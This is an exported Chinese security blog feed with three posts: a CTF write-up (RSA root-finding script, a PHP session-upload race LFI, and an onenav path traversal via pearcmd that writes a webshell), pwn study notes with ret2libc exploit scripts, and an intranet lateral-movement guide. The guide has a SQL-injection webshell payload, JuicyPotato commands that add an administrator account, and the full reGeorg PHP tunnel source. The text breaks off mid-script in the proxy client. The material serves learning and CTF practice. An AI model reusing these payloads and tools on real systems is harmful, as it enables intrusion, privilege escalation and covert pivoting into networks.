d == 1:</span><br><span class="line">            j = 0</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;[+] Calculating DLP...&#x27;)</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">            print(&#x27;[+] Finish DLP...&#x27;)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))</span><br><span class="line">    print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result))</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def onemod(p,r): </span><br><span class="line">    t=p-2 </span><br><span class="line">    while pow(t,(p-1) // r,p)==1: </span><br><span class="line">        t -= 1 </span><br><span class="line">    return pow(t,(p-1) // r,p) </span><br><span class="line"></span><br><span class="line">def solution(p,root,e):  </span><br><span class="line">    g = onemod(p,e) </span><br><span class="line">    may = set() </span><br><span class="line">    for i in range(e): </span><br><span class="line">        may.add(root * pow(g,i,p)%p) </span><br><span class="line">    return may</span><br><span class="line">def union(x1, x2):</span><br><span class="line">    a1, m1 = x1</span><br><span class="line">    a2, m2 = x2</span><br><span class="line">    d = gmpy2.gcd(m1, m2)</span><br><span class="line">    assert (a2 - a1) % d == 0</span><br><span class="line">    p1,p2 = m1 // d,m2 // d</span><br><span class="line">    _,l1,l2 = gmpy2.gcdext(p1,p2)</span><br><span class="line">    k = -((a1 - a2) // d) * l1</span><br><span class="line">    lcm = gmpy2.lcm(m1,m2)</span><br><span class="line">    ans = (a1 + k * m1) % lcm</span><br><span class="line">    return ans,lcm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def excrt(ai,mi):</span><br><span class="line">    tmp = zip(ai,mi)</span><br><span class="line">    return reduce(union, tmp)</span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp,e,p)</span><br><span class="line">mq = AMM(cq,e,q)</span><br><span class="line">mps = solution(p,mp,e)</span><br><span class="line">mqs = solution(q,mq,e)</span><br><span class="line">for mpp in tqdm(mps):</span><br><span class="line">    for mqq in mqs:</span><br><span class="line">        ai = [int(mpp),int(mqq)]</span><br><span class="line">        mi = [p,q]</span><br><span class="line">        m = CRT_list(ai,mi)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        if b&#x27;flag&#x27; in flag:</span><br><span class="line">            print(flag)</span><br><span class="line">            exit(0)</span><br></pre></td></tr></table></figure>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="多页面爬取"><a href="#多页面爬取" class="headerlink" title="多页面爬取"></a>多页面爬取</h3><p>抓包爆破 每一个页面下的字母合并即可</p>
<h3 id="lfi-system"><a href="#lfi-system" class="headerlink" title="lfi_system"></a>lfi_system</h3><p>dirsearch扫描 发现php.php</p>
<p>寻找到 session.upload_progress.enabled &#x3D; on开启的</p>
<p>由于session.upload_progress.cleanup默认开启 需要利用条件竞争来读取session文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/qq_46918279/article/details/120106832#WEB82-session</span><br><span class="line">文件包含</span><br></pre></td></tr></table></figure>

<p>采用bp抓包手动爆破</p>
<p>构造上传文件的页面，对环境上传文件，然后抓包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://47.105.39.3:22003/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56ebfc151d.png" alt="image-20221223170254461" data-caption="image-20221223170254461" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56ecf346ce.png" alt="image-20221223170309946" data-caption="image-20221223170309946" loading="lazy"></p>
<p>设置两项 条件竞争即可</p>
<h3 id="onenav"><a href="#onenav" class="headerlink" title="onenav"></a>onenav</h3><p>打开发现为onenav框架，通过github查看源码得知存在version.txt文件。访问可以得到版本号为0.9.14</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56ee978df2.png" alt="image-20221223170336199" data-caption="image-20221223170336199" loading="lazy"></p>
<p>搜索相应版本漏洞，在github发现存在路径穿越漏洞，但没有详细，对比0.9.14与0.9.15发现最后过滤了 ..&#x2F; 与 .&#x2F; ，且后面once_include()中存在可控参数</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56eff4767d.png" alt="image-20221223170357983" data-caption="image-20221223170357983" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56f0916cc3.png" alt="image-20221223170407731" data-caption="image-20221223170407731" loading="lazy"></p>
<p>接着通过pearcmd执行系统命令即可，本来想反弹shell，但发现空格绕过一直绕不过去，最后想到直接获取$_POST参数来执行命令就是了。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;c=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=system($_POST[&#x27;a&#x27;])?&gt;+/tmp/hello1.php</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56f1e3c9d3.png" alt="image-20221223170428836" data-caption="image-20221223170428836" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56f26df569.png" alt="image-20221223170437570" data-caption="image-20221223170437570" loading="lazy"></p>
]]></content>
      <tags>
        <tag>技术</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn的学习笔记</title>
    <url>/2022/12/10/%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec 文件 //查看保护措施</span><br><span class="line">	Arch:</span><br><span class="line">	RELRO: 动态连接只读</span><br><span class="line">	Stack: 栈溢出状态</span><br><span class="line">	NX: 栈不可执行</span><br><span class="line">	PIE:</span><br><span class="line">	RWX: 可读可写可执行</span><br><span class="line">	</span><br><span class="line">file //查看多少位</span><br><span class="line">	statically linked // 静态连接</span><br><span class="line">	</span><br><span class="line">ldd a.out // 查看动态连接库</span><br><span class="line">echo  ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo= | base64 -d</span><br></pre></td></tr></table></figure>

<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F5 //反编译功能</span><br><span class="line">shift + F12 //查找字符串</span><br><span class="line">G //搜0x地址</span><br></pre></td></tr></table></figure>

<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h4 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0xffffd1a8</span> - <span class="number">0xffffd13c</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">108</span>)</span><br></pre></td></tr></table></figure>

<h4 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2text&quot;</span>) //本地调试</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.20.147&quot;</span>,<span class="number">12345</span>) //远程调试</span><br><span class="line"></span><br><span class="line">io.recvline() //接收一行</span><br><span class="line"></span><br><span class="line">io.recv() //接收全部</span><br><span class="line"></span><br><span class="line">io.send() //里面是字节流</span><br><span class="line"></span><br><span class="line">io.sendline(payload) //传递字节流</span><br><span class="line"></span><br><span class="line">io.interactive() //获得交互</span><br><span class="line"></span><br><span class="line">asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>) //生成shell，ljust补充垃圾数据到<span class="number">112</span>个</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2syscall&quot;</span>) //ELF值</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span>(<span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))) //查看/<span class="built_in">bin</span>/sh位置</span><br></pre></td></tr></table></figure>

<h2 id="gbd"><a href="#gbd" class="headerlink" title="gbd"></a>gbd</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic 200 //生成随机数</span><br><span class="line">cyclic -l daab //计算偏移</span><br><span class="line">run //测试</span><br><span class="line">b //打断点</span><br><span class="line">s //暂停</span><br><span class="line">vmmap //显示虚拟内存的分布</span><br><span class="line">stack 24</span><br><span class="line">plt //动态plt</span><br></pre></td></tr></table></figure>

<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/10/639458d5ca3aa.png" alt="1" data-caption="1" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/10/639458dd2a8c9.png" alt="2" data-caption="2" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/10/639458e213582.png" alt="3" data-caption="3" loading="lazy"></p>
<p>返回导向编程：</p>
<table>
<thead>
<tr>
<th align="left">int</th>
<th>80h</th>
<th>0x08049421</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ebx</td>
<td>&#x2F;bin&#x2F;sh</td>
<td>0x080BE408</td>
</tr>
<tr>
<td align="left">ecx</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td align="left">edx</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td align="left">pop_edx_ecx_ebx_ret addr</td>
<td></td>
<td>0x0806eb90</td>
</tr>
<tr>
<td align="left">0xb</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left">pop_eax_ret addr</td>
<td></td>
<td>0x080bb196</td>
</tr>
<tr>
<td align="left">local</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor //异或 -&gt; 逻辑与 , 逻辑或</span><br><span class="line"></span><br><span class="line">sys_execve() -&gt; 0xb -&gt; 11</span><br><span class="line"></span><br><span class="line">int 0x80 (eax=0xb , ebx=0x8048xxx , ecx=0 , edx=0)</span><br><span class="line"></span><br><span class="line">ROPgadget --binary 二进制文件 --only &quot;寻找什么样的内容&quot;</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep ebx</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2syscall --only &quot;int&quot;</span><br><span class="line"></span><br><span class="line">无 int 80</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space //随机化</span><br></pre></td></tr></table></figure>

<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/10/639458eabe21d.png" alt="4" data-caption="4" loading="lazy"></p>
<p>Linux</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings ret2libc1 | grep /bin/sh //直接查看程序有没有/bin/sh</span><br></pre></td></tr></table></figure>

<p>pwntools</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">elf.plt[&quot;system&quot;]</span><br><span class="line">elf.symbols[&quot;buf2&quot;]</span><br></pre></td></tr></table></figure>

<p>pwndbg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plt // 查看plt</span><br></pre></td></tr></table></figure>

<p>ret2libc1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./ret2libc1&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc1&quot;)</span><br><span class="line">system_plt = elf.plt[&quot;system&quot;]</span><br><span class="line">bin_sh = next(elf.search(b&quot;/bin/sh&quot;))</span><br><span class="line">payload = b&#x27;A&#x27; * 112 + p32(system_plt) + b&#x27;BBBB&#x27; + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>ret2libc2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1 from pwn import *     </span><br><span class="line"> 2 io = process(&quot;./ret2libc2&quot;)</span><br><span class="line"> 3 elf = ELF(&quot;./ret2libc2&quot;)</span><br><span class="line"> 4 get_plt = elf.plt[&quot;gets&quot;]</span><br><span class="line"> 5 system_plt = elf.plt[&quot;system&quot;]</span><br><span class="line"> 6 buf2 = elf.symbols[&quot;buf2&quot;]</span><br><span class="line"> 7 io.recv()</span><br><span class="line"> 8 payload = b&#x27;A&#x27; * 112 + p32(get_plt) + p32(system_plt) + p32(buf2) + p32(buf2)</span><br><span class="line"> 9 io.sendline(payload)</span><br><span class="line">10 io.sendline(b&quot;/bin/sh\x00&quot;)</span><br><span class="line">11 io.interactive()</span><br></pre></td></tr></table></figure>

<p>ret2libc3:</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/63957bfb81c20.png" alt="5" data-caption="5" loading="lazy"></p>
<p>puts地址泄露：0xf7e37c40</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/6395851ae3761.png" alt="6" data-caption="6" loading="lazy"></p>
<p>plt - 距离 &#x3D; system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xf7e37c40 - 0x2345 =  system(0xf7e358fb)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">io = process(&quot;./ret2libc3&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot; :&quot;, str(elf.got[&quot;puts&quot;]))</span><br><span class="line">io.recvuntilb(b&quot; : &quot;)</span><br><span class="line">libcBase = int(io.recvuntil(b&quot;\n&quot;, drop = True) , 16) - libc.symbols[&quot;puts&quot;]</span><br><span class="line">success(&quot;libcBase -&gt; &#123;: #x&#125;&quot;.format(libcBase))</span><br><span class="line">payload = flat(cyclic(60), libcBase + libc.symbols[&quot;system&quot;], 0xdeadbeeF, next(elf.search(b&quot;sh\x00&quot;)))</span><br><span class="line">io.sendlineafter(b&quot; :&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>内网-横向渗透</title>
    <url>/2022/10/26/neiwang/</url>
    <content><![CDATA[<p>1</p>
<h2 id="利用SQL注入获取webshell"><a href="#利用SQL注入获取webshell" class="headerlink" title="利用SQL注入获取webshell"></a>利用SQL注入获取webshell</h2><p>核心命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mysql导出函数： [将数据库里面的内容导出]</span><br><span class="line">	into outfile</span><br><span class="line">	into dumpfile [可以写16进制写入]</span><br><span class="line"></span><br><span class="line">	当知道绝对路径时，且可以导出权限开启的时候就可以拿到Webshell。 DNS注入 load_file</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用sql注入生成一句话木马：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=7 union select 1,&#x27;&lt;?php eval($_REQUEST[8])?&gt;&#x27; into outfile &#x27;c:/phpstudy/www/125.php&#x27;</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/neiwang/1.png" alt="1" data-caption="1" loading="lazy"></p>
<h2 id="上传成功利用webshell管理工具进行遍历"><a href="#上传成功利用webshell管理工具进行遍历" class="headerlink" title="上传成功利用webshell管理工具进行遍历"></a>上传成功利用webshell管理工具进行遍历</h2><p>查看管理权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami 查看当前用户权限</span><br><span class="line">netstat -ano   查看本机开放的端口		</span><br><span class="line">tasklist 查看本机运行的程序[类似于任务管理器]</span><br><span class="line">systeminfo 查看计算机信息</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/neiwang/2.png" alt="2" data-caption="2" loading="lazy"></p>
<p>windows漏洞查看(<a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a>).</p>
<p>使用webshell管理工具上传exp.</p>
<p>权限是test权限使用exp进行提权,使用exp(JuicyPotato.exe).</p>
<p>使用方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JuicyPotato.exe -p &quot;需要执行的命令&quot;</span><br><span class="line">添加账号:</span><br><span class="line">JuicyPotato.exe -p &quot;net user qqq 123 /add&quot;</span><br><span class="line">提升至管理员组:</span><br><span class="line">JuicyPotato.exe -p &quot;net localgroup administrators qqq /add&quot;</span><br></pre></td></tr></table></figure>

<p>使用远程桌面进行连接发现不是一台服务器，对方使用了端口映射.</p>
<p>我们使用代理脚本(xxx.php)使用webshell管理工具进行上传:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*二开作者qq2565543706*/</span><br><span class="line">ini_set(&quot;allow_url_fopen&quot;, true);</span><br><span class="line">ini_set(&quot;allow_url_include&quot;, true);</span><br><span class="line">error_reporting(E_ERROR | E_PARSE);</span><br><span class="line"></span><br><span class="line">if( !function_exists(&#x27;apache_request_headers&#x27;) ) &#123;</span><br><span class="line">    function apache_request_headers() &#123;</span><br><span class="line">        $arh = array();</span><br><span class="line">        $rx_http = &#x27;/\AHTTP_/&#x27;;</span><br><span class="line"></span><br><span class="line">        foreach($_SERVER as $key =&gt; $val) &#123;</span><br><span class="line">            if( preg_match($rx_http, $key) ) &#123;</span><br><span class="line">                $arh_key = preg_replace($rx_http, &#x27;&#x27;, $key);</span><br><span class="line">                $rx_matches = array();</span><br><span class="line">                $rx_matches = explode(&#x27;_&#x27;, $arh_key);</span><br><span class="line">                if( count($rx_matches) &gt; 0 and strlen($arh_key) &gt; 2 ) &#123;</span><br><span class="line">                    foreach($rx_matches as $ak_key =&gt; $ak_val) &#123;</span><br><span class="line">                        $rx_matches[$ak_key] = ucfirst($ak_val);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $arh_key = implode(&#x27;-&#x27;, $rx_matches);</span><br><span class="line">                &#125;</span><br><span class="line">                $arh[$arh_key] = $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return( $arh );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;GET&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    exit(&quot;Georg says, &#x27;All seems fine&#x27;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">	set_time_limit(0);</span><br><span class="line">	$headers=apache_request_headers();</span><br><span class="line">	$cmd = $headers[&quot;X-CMD&quot;];</span><br><span class="line">    switch($cmd)&#123;</span><br><span class="line">		case &quot;CONNECT&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">				$target = $headers[&quot;X-TARGET&quot;];</span><br><span class="line">				$port = (int)$headers[&quot;X-PORT&quot;];</span><br><span class="line">				#$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">				#if ($sock === false)</span><br><span class="line">				#&#123;</span><br><span class="line">				#	header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">				#	header(&#x27;X-ERROR: Failed creating socket&#x27;);</span><br><span class="line">				#	return;</span><br><span class="line">				#&#125;</span><br><span class="line">        $res = fsockopen($target, $port);</span><br><span class="line">				#$res = @socket_connect($sock, $target, $port);</span><br><span class="line">                if ($res === false)</span><br><span class="line">				&#123;</span><br><span class="line">					header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">					header(&#x27;X-ERROR: Failed connecting to target&#x27;);</span><br><span class="line">					return;</span><br><span class="line">				&#125;</span><br><span class="line">				#socket_set_nonblock($res);</span><br><span class="line"></span><br><span class="line">        stream_set_blocking($res, false);</span><br><span class="line">				@session_start();</span><br><span class="line">				$_SESSION[&quot;run&quot;] = true;</span><br><span class="line">                $_SESSION[&quot;writebuf&quot;] = &quot;&quot;;</span><br><span class="line">                $_SESSION[&quot;readbuf&quot;] = &quot;&quot;;</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                header(&#x27;X-STATUS: OK&#x27;);</span><br><span class="line">                header(&quot;Connection: close&quot;);</span><br><span class="line">                ignore_user_abort();</span><br><span class="line">                ob_start();</span><br><span class="line">                $size = ob_get_length();</span><br><span class="line">                header(&quot;Content-Length: $size&quot;);</span><br><span class="line">                ob_end_flush();</span><br><span class="line">                flush();</span><br><span class="line">				session_write_close();</span><br><span class="line"></span><br><span class="line">				while ($_SESSION[&quot;run&quot;])</span><br><span class="line">				&#123;</span><br><span class="line">					$readBuff = &quot;&quot;;</span><br><span class="line">					@session_start();</span><br><span class="line">					$writeBuff = $_SESSION[&quot;writebuf&quot;];</span><br><span class="line">					$_SESSION[&quot;writebuf&quot;] = &quot;&quot;;</span><br><span class="line">					session_write_close();</span><br><span class="line">                    if ($writeBuff != &quot;&quot;)</span><br><span class="line">					&#123;</span><br><span class="line">            stream_set_blocking($res, false);</span><br><span class="line">						$i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff));</span><br><span class="line">						if($i === false)</span><br><span class="line">						&#123;</span><br><span class="line">							@session_start();</span><br><span class="line">                            $_SESSION[&quot;run&quot;] = false;</span><br><span class="line">                            session_write_close();</span><br><span class="line">                            header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">							header(&#x27;X-ERROR: Failed writing socket&#x27;);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">          # stream_set_timeout($res, 1);</span><br><span class="line">          stream_set_blocking($res, false);</span><br><span class="line">          while ($o = fgets($res, 10)) &#123;</span><br><span class="line">					if($o === false)</span><br><span class="line">						&#123;</span><br><span class="line">                            @session_start();</span><br><span class="line">                            $_SESSION[&quot;run&quot;] = false;</span><br><span class="line">                            session_write_close();</span><br><span class="line">							header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">							header(&#x27;X-ERROR: Failed reading from socket&#x27;);</span><br><span class="line">						&#125;</span><br><span class="line">						$readBuff .= $o;</span><br><span class="line">					&#125;</span><br><span class="line">                    if ($readBuff!=&quot;&quot;)&#123;</span><br><span class="line">                        @session_start();</span><br><span class="line">                        $_SESSION[&quot;readbuf&quot;] .= $readBuff;</span><br><span class="line">                        session_write_close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    #sleep(0.2);</span><br><span class="line">				&#125;</span><br><span class="line">                fclose($res);</span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">		case &quot;DISCONNECT&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">                error_log(&quot;DISCONNECT recieved&quot;);</span><br><span class="line">				@session_start();</span><br><span class="line">				$_SESSION[&quot;run&quot;] = false;</span><br><span class="line">				session_write_close();</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">		case &quot;READ&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">				@session_start();</span><br><span class="line">				$readBuffer = $_SESSION[&quot;readbuf&quot;];</span><br><span class="line">                $_SESSION[&quot;readbuf&quot;]=&quot;&quot;;</span><br><span class="line">                $running = $_SESSION[&quot;run&quot;];</span><br><span class="line">				session_write_close();</span><br><span class="line">                if ($running) &#123;</span><br><span class="line">					header(&#x27;X-STATUS: OK&#x27;);</span><br><span class="line">                    header(&quot;Connection: Keep-Alive&quot;);</span><br><span class="line">					echo $readBuffer;</span><br><span class="line">					return;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">                    header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">                    header(&#x27;X-ERROR: RemoteSocket read filed&#x27;);</span><br><span class="line">					return;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">		case &quot;FORWARD&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">                @session_start();</span><br><span class="line">                $running = $_SESSION[&quot;run&quot;];</span><br><span class="line">				session_write_close();</span><br><span class="line">                if(!$running)&#123;</span><br><span class="line">                    header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">					header(&#x27;X-ERROR: No more running, close now&#x27;);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                header(&#x27;Content-Type: application/octet-stream&#x27;);</span><br><span class="line">				$rawPostData = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">				if ($rawPostData) &#123;</span><br><span class="line">					@session_start();</span><br><span class="line">					$_SESSION[&quot;writebuf&quot;] .= $rawPostData;</span><br><span class="line">					session_write_close();</span><br><span class="line">					header(&#x27;X-STATUS: OK&#x27;);</span><br><span class="line">                    header(&quot;Connection: Keep-Alive&quot;);</span><br><span class="line">					return;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">					header(&#x27;X-ERROR: POST request read filed&#x27;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如图所示启用成功:</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/neiwang/3.png" alt="3" data-caption="3" loading="lazy"></p>
<p>使用全局代理工具(Proxifier)进行代理:</p>
<p>1,起用python监听脚本(使用python2.7版本):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://&#123;xxx.php&#125;地址 -p 本地监听端口</span><br></pre></td></tr></table></figure>

<p>源码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line">import argparse</span><br><span class="line">import urllib3</span><br><span class="line">from threading import Thread</span><br><span class="line">from urlparse import urlparse</span><br><span class="line">from socket import *</span><br><span class="line">from threading import Thread</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># Constants</span><br><span class="line">SOCKTIMEOUT = 5</span><br><span class="line">RESENDTIMEOUT = 300</span><br><span class="line">VER = &quot;\x05&quot;</span><br><span class="line">METHOD = &quot;\x00&quot;</span><br><span class="line">SUCCESS = &quot;\x00&quot;</span><br><span class="line">SOCKFAIL = &quot;\x01&quot;</span><br><span class="line">NETWORKFAIL = &quot;\x02&quot;</span><br><span class="line">HOSTFAIL = &quot;\x04&quot;</span><br><span class="line">REFUSED = &quot;\x05&quot;</span><br><span class="line">TTLEXPIRED = &quot;\x06&quot;</span><br><span class="line">UNSUPPORTCMD = &quot;\x07&quot;</span><br><span class="line">ADDRTYPEUNSPPORT = &quot;\x08&quot;</span><br><span class="line">UNASSIGNED = &quot;\x09&quot;</span><br><span class="line"></span><br><span class="line">BASICCHECKSTRING = &quot;Georg says, &#x27;All seems fine&#x27;&quot;</span><br><span class="line"></span><br><span class="line"># Globals</span><br><span class="line">READBUFSIZE = 1024</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">RESET_SEQ = &quot;\033[0m&quot;</span><br><span class="line">COLOR_SEQ = &quot;\033[1;%dm&quot;</span><br><span class="line">BOLD_SEQ = &quot;\033[1m&quot;</span><br><span class="line"></span><br><span class="line">BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)</span><br><span class="line"></span><br><span 